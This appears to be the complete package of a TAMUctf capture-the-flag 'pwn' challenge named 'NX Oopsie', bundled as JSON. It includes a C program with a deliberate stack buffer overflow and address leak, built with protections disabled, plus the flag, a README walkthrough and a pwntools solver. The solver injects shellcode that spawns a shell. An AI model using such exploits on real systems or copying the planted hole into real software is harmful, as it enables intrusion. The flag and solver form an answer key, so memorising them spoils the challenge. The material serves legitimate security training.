{
    "challenge.py": "from hacksport.operations import execute\nfrom hacksport.problem import Challenge, File\n\n\nclass Problem(Challenge):\n    def setup(self):\n        pass\n\n    def generate_flag(self, random):\n        return r\"gigem{0oP5_al1_3xeCu7aB1e}\"\n",
    "Dockerfile": "FROM alpine as build\n\nRUN apk --no-cache add alpine-sdk\n\nWORKDIR /opt/build\nADD Makefile /opt/build/Makefile\nADD nx-oopsie.c /opt/build/nx-oopsie.c\n\nRUN make\n\nFROM alpine\n\nRUN apk --no-cache add socat\n\nEXPOSE 7234\n\nCOPY --from=build /opt/build/nx-oopsie /usr/bin/nx-oopsie\nADD flag.txt /root/flag.txt\n\nWORKDIR /root\n\nENTRYPOINT [\"socat\", \"TCP-LISTEN:7234,reuseaddr,fork\", \"EXEC:/usr/bin/nx-oopsie,stderr\"]\n",
    "flag.txt": "gigem{0oP5_al1_3xeCu7aB1e}\n",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := -fno-stack-protector -z execstack\nCONTAINER := nx-oopsie\n\nall: nx-oopsie\n\nclean: .PHONY\n\trm -f nx-oopsie\n\nnx-oopsie: nx-oopsie.c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile nx-oopsie.c\n\tdocker build -t $(CONTAINER) .\n\nrun: docker\n\tdocker run --rm -ti --name nx-oopsie nx-oopsie\n\nextract: docker\n\t$(eval id := $(shell docker create $(CONTAINER)))\n\tdocker cp $(id):/usr/bin/nx-oopsie - | tar xv nx-oopsie\n\tdocker rm -v $(id)\n\n.PHONY:\n",
    "nx-oopsie.c": "#if _FORTIFY_SOURCE > 0\n  #undef _FORTIFY_SOURCE\n  #define _FORTIFY_SOURCE 0\n#endif\n\n#include <stdio.h>\n#include <string.h>\n\nvoid vuln() {\n  char buf[64];\n  printf(\"What's your name? \");\n  fflush(stdout);\n  if (fgets(buf, sizeof(buf) * 2, stdin) != NULL) {\n    printf(\"Hi %s! Pleased to meet you.\\n\", buf);\n  }\n}\n\nvoid leak() {\n  printf(\"Psst! I heard you might need this...: %p\\n\", __builtin_frame_address(0));\n}\n\nint main() {\n  leak();\n  vuln();\n}\n",
    "problem.json": "{\n  \"name\": \"NX Oopsie\",\n  \"category\": \"Pwn\",\n  \"description\": \"Attack this binary and get the flag!\\n<a href='https://tamuctf.com/static-files/nx-oopsie'>nx-oopsie</a>.\\n<code>openssl s_client -connect tamuctf.com:443 -servername nx-oopsie -quiet</code>\",\n  \"score\" : 100,\n  \"hints\": [],\n  \"walkthrough\": \"N/A\",\n  \"author\": \"Addison Crump\",\n  \"organization\": \"TAMUctf\",\n  \"event\": \"TAMUctf\"\n}\n\n",
    "README.md": "# nx-oopsie\n\n## Description\n\nAttack this binary and get the flag!\n\n```nc challenges.tamuctf.com 7234```\n\n## Solution\n\n```text\n\u276f checksec nx-oopsie\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      PIE enabled\n    RWX:      Has RWX segments\n```\n\nWe have a 64 bit binary with no canary, writable/executable segments, and the name \"nx-oopsie\".  It seems pretty likely that we'll be executing shellcode on the stack.  Running the binary prints\n\n```text\n\u276f ./nx-oopsie\nPsst! I heard you might need this...: 0x7ffd07890fc0\nWhat's your name? Teddy\nHi Teddy\n! Pleased to meet you.\n```\n\nThe address it prints is in the right range to be the stack and a quick check with gdb shows that address is 64 bytes after the location our input is saved in.  All we need to do is use the leaked address to calculate our shellcode location, feed the program shellcode as input, and then overwrite the saved return pointer with the location of our shellcode.  \n\n```python\nfrom pwn import *\n\nBUF_SIZE = 72\n\np = process(\"./nx-oopsie\")\n\nstack_addr = int(p.recvline().decode().split(\":\")[1][1:],16)\n# http://shell-storm.org/shellcode/files/shellcode-806.php\npayload = b\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\".ljust(BUF_SIZE, b'a')\npayload += p64(stack_addr - 64)\np.sendline(payload)\np.interactive()\n```",
    "solver.py": "from pwn import *\n\nBUF_SIZE = 72\n\n#p = process(\"./nx-oopsie\")\np = remote('localhost', 4444)\n\nstack_addr = int(p.recvline().decode().split(\":\")[1][1:],16)\n# http://shell-storm.org/shellcode/files/shellcode-806.php\npayload = b\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\".ljust(BUF_SIZE, b'a')\npayload += p64(stack_addr - 64)\np.sendline(payload)\np.interactive()\n",
    "category": "pwn"
}